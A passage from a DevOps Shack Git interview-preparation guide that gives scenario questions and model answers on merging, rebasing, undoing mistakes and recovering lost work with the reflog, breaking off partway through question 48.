# Git — Scenario-Based Questions

<!-- DEVOPS-SHACK:HEADER -->
<p align="center">
  <a href="https://www.youtube.com/@devopsshack"><img alt="YouTube DevOps Shack" src="https://img.shields.io/badge/YouTube-DevOps%20Shack-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://www.youtube.com/@shackverse"><img alt="YouTube DevOps Shack Hindi" src="https://img.shields.io/badge/Hindi-@shackverse-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://devopsshack.com"><img alt="devopsshack.com" src="https://img.shields.io/badge/Courses-devopsshack.com-C6FF4D?style=flat-square&labelColor=0B0F1A"/></a>
  <a href="https://www.instagram.com/devopsshack"><img alt="Instagram" src="https://img.shields.io/badge/Instagram-@devopsshack-E4405F?style=flat-square&logo=instagram&logoColor=white"/></a>
  <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack"><img alt="Original repo" src="https://img.shields.io/badge/Original-DevOps%20Shack%20repo-4DE8FF?style=flat-square&logo=github&labelColor=0B0F1A"/></a>
</p>
<p align="center"><sub>Part of <b><a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">DevOps &amp; Cloud Interview Preparation</a></b> — created by <b><a href="https://www.youtube.com/@devopsshack">DevOps Shack</a></b>. Free to learn from; please credit DevOps Shack when sharing.</sub></p>
<!-- /DEVOPS-SHACK:HEADER -->

> Real-world Git and GitHub situations and how a senior engineer handles them · 200 questions · 🟢 Beginner 🟡 Intermediate 🔴 Advanced

[⬅ Back to Git & GitHub](./README.md) · [🏠 Home](../README.md)

## Table of contents
- [Branching and Merging Workflows](#branching-and-merging-workflows) — Q1–Q25
- [Undoing Mistakes](#undoing-mistakes) — Q26–Q50
- [Rebase, Cherry-pick and History Rewriting](#rebase-cherry-pick-and-history-rewriting) — Q51–Q75
- [Remotes, Collaboration and Pull Requests](#remotes-collaboration-and-pull-requests) — Q76–Q100
- [Branching Strategies and Releases](#branching-strategies-and-releases) — Q101–Q125
- [Protection, Hooks and Policy](#protection-hooks-and-policy) — Q126–Q150
- [Secrets, Signing and Security](#secrets-signing-and-security) — Q151–Q175
- [Scale, Submodules, LFS and GitHub Automation](#scale-submodules-lfs-and-github-automation) — Q176–Q200

---

## Branching and Merging Workflows

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q1. You run `git pull` and Git stops with a merge conflict in `app.py`. What do you do? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Both you and a teammate changed the same lines. Git paused the merge and marked the file with conflict markers.

**What I'd do →**
1. `git status` to see the "both modified" files.
2. Open the file, find `<<<<<<<`, `=======`, `>>>>>>>`, and decide what the final code should be. Talk to the author if the intent is unclear.
3. Remove the markers, then `git add app.py`.
4. Run the tests, then `git commit` (or `git merge --continue`).

```bash
git status
git add app.py
git merge --continue
```

**Why →** Git only knows both sides changed the same hunk, not which one is right. A human has to pick, and tests prove the result.

**Interview tip →** Say you run tests before finishing the merge, not after.

</details>

### Q2. Your feature branch is three weeks old and `main` has moved a lot. Merge `main` in, or rebase onto it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A private, unshared branch can be rebased safely. A branch others have pulled cannot.

**What I'd do →**
1. If only I use the branch: `git fetch origin && git rebase origin/main`, resolving conflicts commit by commit.
2. If others share it: `git merge origin/main` instead, so nobody has to reset.
3. Push with `git push --force-with-lease` after a rebase.
4. Run the full test suite on the result either way.

**Why →** Rebase gives a linear history that is easy to review. Merge preserves exact history and never rewrites commits others depend on.

**Interview tip →** The deciding factor is "has anyone else based work on these commits", not personal taste.

</details>

### Q3. The team argues about fast-forward merges versus merge commits on `main`. How do you settle it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** This is a policy choice, not a technical right or wrong.

**What I'd do →**
1. Ask what we need from history: a linear log for bisect and changelogs, or visible feature boundaries.
2. For most product teams, pick squash merge in GitHub: one commit per PR, linear `main`.
3. If we need to see feature groupings, use `--no-ff` merge commits.
4. Enforce the choice in repo settings (allow only the chosen merge button) instead of relying on convention.

```bash
git merge --ff-only feature     # refuses if a merge commit would be needed
git merge --no-ff feature       # always creates a merge commit
```

**Why →** A setting that cannot be bypassed ends the argument and keeps history consistent.

**Interview tip →** Mention that you disable the merge types you do not want in GitHub settings.

</details>

### Q4. A teammate branched from the wrong base, and their PR shows 40 unrelated commits. How do you fix it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The branch was cut from another feature branch, so the PR drags that feature's commits along.

**What I'd do →**
1. Identify the commits that really belong to the PR: `git log --oneline origin/main..HEAD`.
2. Transplant only those onto the right base:

```bash
git rebase --onto origin/main <old-base-sha> my-branch
git push --force-with-lease
```

3. Confirm the PR now shows only the intended commits.

**Why →** `--onto` replays commits in the range `old-base..my-branch` onto a new base, leaving the unwanted commits behind.

**Interview tip →** `git rebase --onto` is the answer interviewers hope to hear for "wrong base" questions.

</details>

### Q5. Before merging, you want to see exactly what the feature branch adds compared to `main`. Which commands? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Two questions: which commits, and which changes.

**What I'd do →**
1. Commits only on the feature: `git log --oneline main..feature`.
2. Net changes the feature introduces since it diverged: `git diff main...feature` (three dots).
3. File list only: `git diff --stat main...feature`.

**Why →** Three dots compares the feature tip against the merge base, so you see only the feature's work. Two dots compares both tips and also shows whatever `main` gained meanwhile.

**Interview tip →** Explain the dot difference: it is a classic quick check.

</details>

### Q6. Halfway through a merge you realise you pulled the wrong branch. How do you back out? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The merge is still in progress (conflicts unresolved, no commit yet).

**What I'd do →**
1. `git merge --abort` returns the tree to the pre-merge state.
2. Verify with `git status` that the working tree is clean.
3. Merge the correct branch.

**Why →** `--abort` restores from `ORIG_HEAD` and the saved index. If you had uncommitted changes before starting the merge, Git may not restore them perfectly, so merge from a clean tree.

**Interview tip →** Add that you stash or commit before any merge or rebase.

</details>

### Q7. You keep resolving the same conflicts again and again while rebasing a long-lived branch. How do you stop? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Each replayed commit hits the same hunks, and you redo the resolution every time.

**What I'd do →**
1. Enable rerere (reuse recorded resolution): `git config --global rerere.enabled true`.
2. Resolve once; Git records the preimage and your resolution under `.git/rr-cache`.
3. On later rebases or merges the same conflict is auto-resolved. Review with `git diff` and stage.
4. If a recorded resolution is wrong: `git rerere forget <path>`.

**Why →** Git fingerprints the conflict text and replays your earlier answer.

**Interview tip →** rerere only records resolutions, it does not auto-stage them, so you still review.

</details>

### Q8. You reverted a merged feature, fixed it, and merged the branch again, but the original changes are missing. What happened? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Reverting a merge creates a commit that undoes the changes but leaves the original commits in history. Git thinks those commits are already merged, so a second merge brings nothing from them.

**What I'd do →**
1. Revert the revert on `main`: `git revert <revert-commit-sha>`. This brings the original changes back.
2. Merge the fixed branch; only the new fix commits are added.
3. Alternative: rebase or cherry-pick the feature commits to new SHAs on a fresh branch and open a new PR.

**Why →** Merge logic works on commit ancestry, not content. The reverted commits remain ancestors.

**Interview tip →** This is Linus's well-known "reverting a merge" caveat. Naming it shows depth.

</details>

### Q9. Two branches both regenerated `package-lock.json` and it conflicts every time. What's the clean approach? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Lockfiles are generated, so hand-merging them is error-prone.

**What I'd do →**
1. Resolve `package.json` first (that is human-owned).
2. Take either side of the lockfile, then regenerate it:

```bash
git checkout --theirs package-lock.json
npm install
git add package-lock.json package.json
```

3. Optionally register a merge driver or CI check so the lockfile is verified with `npm ci`.

**Why →** The lockfile must match the final `package.json`. Regenerating guarantees consistency, and `npm ci` in CI catches drift.

**Interview tip →** The same pattern applies to `yarn.lock`, `poetry.lock`, `go.sum`.

</details>

### Q10. During a merge you want your version of one file wholesale and theirs for another. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Per-file decisions during a conflicted merge.

**What I'd do →**
1. Take our side for the file: `git checkout --ours config/prod.yaml`.
2. Take their side for another: `git checkout --theirs docs/guide.md`.
3. Stage both, then finish the merge.

```bash
git checkout --ours config/prod.yaml
git checkout --theirs docs/guide.md
git add config/prod.yaml docs/guide.md
git merge --continue
```

**Why →** In a merge, "ours" is the branch you are on and "theirs" is the one being merged. In a rebase these are swapped.

**Interview tip →** Distinguish this from `-X theirs`, which only auto-wins on conflicting hunks while still merging the non-conflicting ones.

</details>

### Q11. You squash-merged a PR, and `git branch -d feature` says the branch is not fully merged. Is something wrong? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Squash merge creates a new commit with different content ancestry. The original feature commits are not ancestors of `main`.

**What I'd do →**
1. Confirm the PR shows as merged on GitHub and the squash commit is in `main`.
2. Delete the branch with `git branch -D feature`.
3. Turn on "Automatically delete head branches" in repo settings, and run `git fetch --prune` locally.

**Why →** `-d` checks ancestry, and squash breaks it. Content is merged but history is not.

**Interview tip →** Know the trade-off: squash gives clean history but makes `-d`, `git branch --merged` and later merges from the same branch unreliable.

</details>

### Q12. One developer renamed `utils.py` to `helpers.py` while another edited `utils.py`. Will merge handle it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Git does not store renames; it detects them by similarity when merging.

**What I'd do →**
1. Merge normally. With the default `ort` strategy, rename detection usually applies the edit to `helpers.py`.
2. Check: `git status` and `git diff --name-status -M main...feature`.
3. If similarity is too low (heavily edited file), you get a "rename/delete" conflict. Resolve by hand and keep the new name.
4. Tune detection if needed: `git merge -X find-renames=40%`.

**Why →** Rename detection is content-similarity based, default threshold 50%.

**Interview tip →** Advise doing renames in their own commit, with no content edits, so Git can track them.

</details>

### Q13. A hotfix went straight into `release/2.3`. How do you make sure it also reaches `main`? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Fixes made on a release branch must flow forward, or the bug returns in the next release.

**What I'd do →**
1. Open a PR from `release/2.3` into `main` (merge forward), or cherry-pick the fix with `-x`.
2. Prefer the reverse in future: fix on `main` first, then backport to the release branch.
3. Add a CI or checklist rule: no release-branch fix without a linked forward-port PR.

```bash
git switch main
git cherry-pick -x <hotfix-sha>
```

**Why →** `-x` records the origin SHA in the message, making backports traceable.

**Interview tip →** "Fix forward first, backport second" is the policy answer most teams like.

</details>

### Q14. How do you preview the result of a merge without actually creating a commit? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** You want to inspect the merged tree and run tests before committing.

**What I'd do →**
1. `git merge --no-commit --no-ff feature`.
2. Build and test the working tree.
3. Accept with `git commit`, or discard with `git merge --abort`.

**Why →** `--no-ff` ensures a merge is staged even when a fast-forward would be possible; `--no-commit` stops before creating the commit.

**Interview tip →** `git merge-tree --write-tree main feature` can also compute the result without touching your working tree (Git 2.38+).

</details>

### Q15. Someone asks which branches contain a particular commit, for example a security fix. How do you find out? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need to confirm whether the fix has reached release branches.

**What I'd do →**
1. `git branch -r --contains <sha>` lists remote branches containing it.
2. `git tag --contains <sha>` lists tags, which tells you the first release that shipped it.
3. `git describe --contains <sha>` gives the nearest tag name.

**Why →** Containment is just ancestry: a branch contains the commit if the commit is reachable from its tip.

**Interview tip →** If the fix was cherry-picked, the SHA differs. Search with `git log --grep "cherry picked from"` or use `git cherry`.

</details>

### Q16. A bug appeared sometime in the last 200 commits. How do you find the culprit fast? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Binary search over history needs a known good commit and a reliable test.

**What I'd do →**
1. Start: `git bisect start`, `git bisect bad HEAD`, `git bisect good v2.1.0`.
2. Automate with a script that exits 0 for good and non-zero for bad:

```bash
git bisect run ./scripts/repro.sh
git bisect reset
```

3. Read the reported first bad commit and inspect it with `git show`.

**Why →** 200 commits need about 8 steps. Exit code 125 in the script tells bisect to skip an untestable commit.

**Interview tip →** Linear history (squash or rebase) makes bisect cleaner, since merge commits can confuse results.

</details>

### Q17. You need to merge a repo that has no common history with yours. Git refuses. What now? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** `fatal: refusing to merge unrelated histories` appears because the two repos have no shared ancestor.

**What I'd do →**
1. Add the other repo as a remote and fetch it.
2. Merge deliberately:

```bash
git remote add other ../other-repo
git fetch other
git merge other/main --allow-unrelated-histories
```

3. Resolve add/add conflicts (README, .gitignore), then commit.

**Why →** The safety check exists to stop accidental merges of the wrong repo. The flag is an explicit confirmation.

**Interview tip →** For a cleaner layout, first move the other repo's files into a subdirectory with `git filter-repo --to-subdirectory-filter`.

</details>

### Q18. A merge commit looks empty in `git show`, but a bug slipped in through it. How do you inspect it? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Default `git show` on a merge prints a combined diff showing only conflict-resolution changes. If resolution was wrong ("evil merge"), the change lives there.

**What I'd do →**
1. `git show --cc <merge-sha>` shows only hunks that differ from all parents.
2. Compare against each parent: `git diff <merge-sha>^1 <merge-sha>` and `git diff <merge-sha>^2 <merge-sha>`.
3. `git show -m --first-parent <merge-sha>` shows the diff against the first parent only.
4. Rebuild the merge to compare: `git checkout <merge-sha>^1 && git merge <merge-sha>^2`.

**Why →** Conflict resolutions are not attributed to either side, so you have to compare against each parent to see what the merger did.

**Interview tip →** This is why many teams prefer squash merges for features: the PR diff is the whole change.

</details>

### Q19. You must combine two repositories into a monorepo and keep full history for both. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Copying files loses history and blame. We want a real merge.

**What I'd do →**
1. In each source repo, rewrite history into a subdirectory (work on a fresh clone):

```bash
git clone svc-a svc-a-rewrite && cd svc-a-rewrite
git filter-repo --to-subdirectory-filter services/svc-a
```

2. In the monorepo: `git remote add svc-a ../svc-a-rewrite && git fetch svc-a`.
3. `git merge svc-a/main --allow-unrelated-histories -m "Import svc-a"`.
4. Repeat for the other repo, then archive the old repos.

**Why →** Rewriting paths first prevents file collisions and keeps `git log -- services/svc-a` and blame working.

**Interview tip →** Mention `git subtree add` as the simpler option when path-prefixed history is enough.

</details>

### Q20. Your repo has 300 stale branches locally and remotely. How do you clean up safely? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Merged branches are safe to delete, others need a check.

**What I'd do →**
1. `git fetch --prune` to drop stale remote-tracking refs.
2. List merged local branches: `git branch --merged main`, and delete with `git branch -d`.
3. Delete a remote branch: `git push origin --delete old-branch`.
4. Turn on auto-delete of head branches in GitHub and set `fetch.prune true`.

```bash
git branch --merged main | grep -vE '^\*|main|develop' | xargs -r git branch -d
```

**Why →** `-d` refuses unmerged branches, giving a safety net.

**Interview tip →** Squash-merged branches will not show in `--merged`; cross-check with the closed PR list.

</details>

### Q21. You are mid-feature and an urgent bug needs a fix on another branch. You don't want to stash or commit half-done work. What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Switching branches would disturb your working tree.

**What I'd do →**
1. Create a second working directory on the same repo:

```bash
git worktree add ../hotfix-wt -b hotfix/login origin/main
cd ../hotfix-wt
```

2. Fix, test, push from there.
3. Clean up: `git worktree remove ../hotfix-wt`.

**Why →** Worktrees share one object database, so there is no second clone and no stash juggling. Each branch can only be checked out in one worktree at a time.

**Interview tip →** Worktrees are also great for running a long test suite on one branch while coding on another.

</details>

### Q22. A mass reformat commit (Prettier, Black) ruined `git blame`. How do you recover useful blame? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Blame now attributes every line to the formatting commit.

**What I'd do →**
1. Put the formatting commit SHA in `.git-blame-ignore-revs` at the repo root.
2. Tell local Git to use it: `git config blame.ignoreRevsFile .git-blame-ignore-revs`.
3. GitHub's blame view reads that file automatically, no setup needed.
4. Ad hoc: `git blame --ignore-rev <sha> file.py`.

**Why →** Blame skips the listed commits and attributes lines to the previous meaningful change.

**Interview tip →** Do formatting changes as one isolated commit so the ignore list stays short.

</details>

### Q23. Conflict markers are hard to understand because you cannot see the original text. How do you get more context? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The default conflict style shows only two sides.

**What I'd do →**
1. Switch to the three-way style: `git config --global merge.conflictStyle zdiff3` (Git 2.35+; use `diff3` on older versions).
2. Re-create markers in the current file: `git checkout --conflict=zdiff3 -- file`.
3. Now the middle `|||||||` section shows the common ancestor, so you see what each side changed.
4. Use `git mergetool` or an IDE three-pane view for large conflicts.

**Why →** Knowing the base tells you who changed what, which is often the whole puzzle.

**Interview tip →** `zdiff3` also trims common lines from the markers, making them shorter than `diff3`.

</details>

### Q24. You abandoned an old branch's approach, but want Git to record it as merged so it never resurfaces. What do you do? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** You want ancestry without content: a merge that keeps our tree unchanged.

**What I'd do →**
1. On `main`: `git merge -s ours old-approach -m "Mark old-approach as merged; superseded"`.
2. The result tree equals `main`'s, but `old-approach` commits are now ancestors.
3. Future merges of that branch bring in only new commits.

**Why →** `-s ours` is a strategy that ignores the other side's content entirely. It is different from `-X ours`, which only prefers our side in conflicts.

**Interview tip →** Use sparingly; it hides discarded work. Document the reason in the message.

</details>

### Q25. You forked a repo and need to keep your fork's `main` in sync with upstream. How? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Your fork has only `origin`; you need the original as a second remote.

**What I'd do →**
1. `git remote add upstream https://github.com/ORG/REPO.git`.
2. `git fetch upstream`.
3. `git switch main && git merge --ff-only upstream/main` (or `git rebase upstream/main`).
4. `git push origin main`.

Or use the GitHub UI "Sync fork" button, or `gh repo sync OWNER/fork`.

**Why →** `--ff-only` guarantees your fork's `main` stays a pure mirror and fails loudly if you committed there by mistake.

**Interview tip →** Keep your work on topic branches and never commit to your fork's `main`.

</details>

## Undoing Mistakes

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q26. You committed on `main` when you meant to be on a feature branch. Nothing is pushed. Fix it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The commit exists locally only, so history can be moved freely.

**What I'd do →**
1. Create the branch at the current commit: `git branch feature/login`.
2. Move `main` back: `git reset --hard origin/main` (or `HEAD~1` for one commit).
3. `git switch feature/login`; your commit is intact.

**Why →** Branches are just pointers. Creating a new pointer first means the reset cannot lose anything.

**Interview tip →** Always create the safety branch before running `reset --hard`.

</details>

### Q27. You made a typo in your last commit message and have not pushed. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Only the message needs change.

**What I'd do →**
1. `git commit --amend -m "Fix login redirect for SSO users"`.
2. To also add a forgotten file: `git add file && git commit --amend --no-edit`.

**Why →** Amend replaces the last commit with a new one (new SHA). That is safe only while nobody else has the old one.

**Interview tip →** If it is already pushed to a shared branch, do not amend; add a follow-up commit instead.

</details>

### Q28. A bad commit is already on shared `main`. Others have pulled it. How do you undo it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Rewriting shared history would break everyone's clones.

**What I'd do →**
1. `git revert <bad-sha>` creates a new commit that inverts the change.
2. Push normally: `git push origin main`.
3. For several commits: `git revert --no-commit A..B && git commit`.
4. Open a ticket to fix the root cause properly, then reintroduce the change.

**Why →** Revert adds history instead of removing it, so every clone stays compatible.

**Interview tip →** "Revert shared, reset private" is the one-line rule.

</details>

### Q29. You ran `git reset --hard` and lost uncommitted-then-committed work. Can you get it back? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** If the work was ever committed, the commits still exist as unreachable objects and the reflog records where `HEAD` was.

**What I'd do →**
1. `git reflog` and find the entry before the reset, such as `HEAD@{2}`.
2. Restore: `git reset --hard HEAD@{2}`, or safer, `git branch rescue HEAD@{2}`.
3. Verify with `git log rescue`.

**Why →** Reflog entries last 90 days for reachable and 30 days for unreachable commits by default.

**Interview tip →** Work that was never staged or committed is gone; `reset --hard` cannot be undone for those changes.

</details>

### Q30. You need to revert a merge commit on `main`. `git revert` says "commit is a merge but no -m option was given". 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A merge has two parents, so Git cannot know which side's changes to undo.

**What I'd do →**
1. Pick the mainline parent, which is normally parent 1 (the branch merged into): `git revert -m 1 <merge-sha>`.
2. Push the revert commit.
3. Remember the re-merge caveat: to reapply the feature later, revert this revert first.

**Why →** `-m 1` means "keep the first-parent line, undo what the second parent brought in".

**Interview tip →** Check parents with `git show --no-patch --format=%P <sha>`.

</details>

### Q31. You deleted a local branch with unmerged work by mistake. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Deleting a branch removes the pointer, not the commits.

**What I'd do →**
1. Git printed the tip SHA when you deleted: `Deleted branch x (was 3f9a1c2)`. Use it: `git branch x 3f9a1c2`.
2. Otherwise `git reflog` and find the last commit on that branch.
3. Or check if the remote still has it: `git branch -r`.

**Why →** Objects stay in the repo until garbage collection prunes them.

**Interview tip →** Recovery depends on acting before `gc` prunes, usually weeks away.

</details>

### Q32. After `git stash pop` you got conflicts. Is your stash lost? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** When pop conflicts, Git keeps the stash entry instead of dropping it.

**What I'd do →**
1. `git status` to see conflicted files and resolve them like a merge.
2. `git add` the resolved files, then `git reset` to unstage if you want them as plain changes.
3. Drop the stash only when satisfied: `git stash drop`.
4. To retry on a clean tree: `git checkout . && git stash pop`.

**Why →** Pop = apply + drop, but drop is skipped on failure, which protects you.

**Interview tip →** Prefer `git stash apply` for risky cases; drop manually after verifying.

</details>

### Q33. You stashed changes but your new, untracked files stayed behind. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Plain `git stash` saves only tracked changes.

**What I'd do →**
1. `git stash push -u -m "wip: payment form"` includes untracked files.
2. Add `-a` to include ignored files too (rarely needed).
3. List with `git stash list`, restore with `git stash pop`.

**Why →** Untracked files are not in the index or HEAD, so they must be requested explicitly.

**Interview tip →** Always name stashes with `-m`. `stash@{3}` means nothing a week later.

</details>

### Q34. You ran `git add .` and staged a file you didn't want to commit. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Only the index is wrong; the working file is fine.

**What I'd do →**
1. `git restore --staged secrets.env` unstages it and keeps your edits.
2. Add it to `.gitignore` if it must never be committed.
3. `git status` to confirm.

**Why →** `restore --staged` copies HEAD's version into the index. On older Git, `git reset HEAD file` does the same.

**Interview tip →** Review with `git diff --staged` before every commit.

</details>

### Q35. You want to discard local edits to one file and go back to the last commit. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Working tree changes are unwanted.

**What I'd do →**
1. `git restore path/to/file`, or `git restore .` for everything.
2. For untracked files, preview first: `git clean -nd`, then `git clean -fd`.

**Why →** These changes were never committed, so this cannot be undone. Hence preview with `-n`.

**Interview tip →** Mention that `git stash` is the non-destructive alternative if you are unsure.

</details>

### Q36. You made several commits in detached HEAD state and then switched branches. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Git warned you about leaving commits behind. They are unreachable from any branch.

**What I'd do →**
1. `git reflog` and find the last commit made in detached state.
2. `git branch rescued-work <sha>` (or `git switch -c rescued-work <sha>`).
3. Merge or cherry-pick as needed.

**Why →** Reflog tracks `HEAD` movement even without branches.

**Interview tip →** If still in detached HEAD, just run `git switch -c new-branch` before leaving.

</details>

### Q37. You committed a 500 MB video locally, not pushed yet. How do you remove it from the commit? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** If it's in the last commit only, amend. If it's earlier, rewrite.

**What I'd do →**
1. Last commit: `git rm --cached video.mp4 && git commit --amend --no-edit`.
2. Earlier commit: `git rebase -i origin/main`, mark the commit `edit`, remove the file, `git commit --amend`, `git rebase --continue`.
3. Add `*.mp4` to `.gitignore` or track via Git LFS.
4. Confirm: `git log --stat origin/main..HEAD`.

**Why →** The blob is only in your local repo and gets collected after reflog expiry, so pushing never exposes it.

**Interview tip →** Run `git count-objects -vH` and `git gc --prune=now` if you want it gone immediately.

</details>

### Q38. A rebase went badly and your branch is a mess. How do you return to the state before the rebase? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Rebase rewrites commits, but the originals still exist.

**What I'd do →**
1. If still in progress: `git rebase --abort`.
2. If finished: `git reflog` and find the entry `rebase (start)`; take the one just before it.
3. `git reset --hard HEAD@{N}`, or use `ORIG_HEAD` straight after the rebase: `git reset --hard ORIG_HEAD`.

**Why →** `ORIG_HEAD` is set to the previous tip by rebase, merge and reset.

**Interview tip →** `ORIG_HEAD` is overwritten by the next such command, so act immediately.

</details>

### Q39. One commit mixes a refactor and a bug fix. Reviewers want them split. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need two commits from one, with hunks assigned correctly.

**What I'd do →**
1. `git rebase -i HEAD~3`, mark the commit `edit`.
2. `git reset HEAD^` to unstage it, leaving changes in the tree.
3. `git add -p` to stage the refactor hunks, commit, then stage and commit the fix.
4. `git rebase --continue`.

**Why →** Mixed reset keeps the changes but drops the commit, letting you recommit selectively.

**Interview tip →** Small, single-purpose commits make `bisect` and `revert` far cheaper.

</details>

### Q40. Your local `main` is a mess after experiments. You want it to exactly match the remote. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** You accept losing all local-only commits and changes on this branch.

**What I'd do →**
1. Keep a safety net: `git branch backup-main`.
2. `git fetch origin`.
3. `git reset --hard origin/main`.
4. Remove stray files: `git clean -fd` (after `-n`).

**Why →** Fetch updates the remote-tracking ref without touching your branch. Reset then moves your branch and tree to it.

**Interview tip →** `git pull` would try to merge your mess; reset is the clean tool here.

</details>

### Q41. A release introduced a regression from five consecutive commits. How do you revert them as one change? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** You want one clean revert rather than five.

**What I'd do →**
1. Find the range: `git log --oneline -8`.
2. `git revert --no-commit OLDEST^..NEWEST` applies all inverses to the index, newest first.
3. Fix conflicts if later commits overlap, then `git commit -m "Revert checkout rewrite (INC-4821)"`.
4. Push and open a PR for review.

**Why →** `--no-commit` lets you bundle the reverts and describe them with the incident reference.

**Interview tip →** Alternative: revert the single squash or merge commit that brought the work in.

</details>

### Q42. A teammate force-pushed to `main` and your commits vanished from the remote. How do you recover? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** The remote branch pointer moved; the old commits still exist in clones and, for a while, on the server.

**What I'd do →**
1. Check your clone: `git reflog show origin/main` shows the old remote tip.
2. Restore the branch pointer: `git push origin <old-sha>:refs/heads/main --force-with-lease`. Coordinate first.
3. On GitHub, the push activity or Events API shows the previous SHA: `gh api repos/ORG/REPO/events`.
4. Add branch protection to block force pushes to `main`.

**Why →** Anyone with an older clone holds the objects, so the data is rarely truly lost.

**Interview tip →** Use `--force-with-lease`, never plain `--force`, and block both on protected branches.

</details>

### Q43. You think commits were lost and the reflog entry has expired. Can anything still be found? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** If `gc` has not pruned the objects yet, they exist as dangling commits even without reflog entries.

**What I'd do →**
1. `git fsck --lost-found --no-reflogs` lists dangling commits and blobs.
2. Inspect: `git show <sha>` or `git log -1 <sha>`.
3. Rescue: `git branch recovered <sha>`.
4. Stop all `git gc` activity: `git config gc.auto 0`.

**Why →** Pruning happens only after `gc.pruneExpire` (default 2 weeks) for unreachable objects.

**Interview tip →** Also ask whether a teammate, CI runner or fork has a copy.

</details>

### Q44. You edited a file with a debug print and a real fix. You want to commit only the fix. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Two changes live in one file.

**What I'd do →**
1. `git add -p file.py`.
2. Answer `y` to the fix hunk, `n` to the debug hunk, `s` to split a hunk, `e` to edit it by hand.
3. `git diff --staged` to verify, then commit.
4. Remove the debug line afterwards.

**Why →** Patch mode stages hunks, not whole files, so commits stay focused.

**Interview tip →** Mention `git commit -p` as a shortcut.

</details>

### Q45. You need to stash only two files and keep the rest of your changes in place. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Default stash grabs everything.

**What I'd do →**
1. `git stash push -m "wip: parser" -- src/parser.py src/lexer.py`.
2. Or interactively: `git stash push -p`.
3. To stash unstaged work but keep what is staged: `git stash push --keep-index`.

**Why →** Pathspecs after `--` limit the stash to those files (Git 2.13+).

**Interview tip →** Know `--keep-index` for testing exactly what you are about to commit.

</details>

### Q46. You made four messy "wip" commits locally. You want a single clean commit before pushing. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Local, unpushed history can be collapsed.

**What I'd do →**
1. `git reset --soft HEAD~4` moves the branch back but leaves all changes staged.
2. `git commit -m "Add retry logic to payment client"`.
3. Alternative: `git rebase -i HEAD~4` and mark later commits `squash` or `fixup`.

**Why →** Soft reset only moves the branch pointer; index and working tree stay as they are.

**Interview tip →** `git commit --fixup <sha>` plus `git rebase -i --autosquash` is the polished workflow.

</details>

### Q47. You committed `.env` earlier and want Git to stop tracking it but keep the local copy. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** `.gitignore` only affects untracked files, so a tracked file must be removed from the index.

**What I'd do →**
1. `git rm --cached .env`.
2. Add `.env` to `.gitignore`.
3. Commit: `git commit -m "Stop tracking .env"`.
4. If it was pushed, treat contents as leaked: rotate every secret in it.

**Why →** Removing from the index does not remove it from history. Old commits still hold the file.

**Interview tip →** Rotation, not deletion, is what actually fixes a leaked secret.

</details>

### Q48. You merged locally and then realised it was wrong. It has not been pushed. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A local merge commit can simply be dropped.

**What I'd do →**
1. `git reset --hard ORIG_HEAD` returns to the pre-merge tip if you act right after.
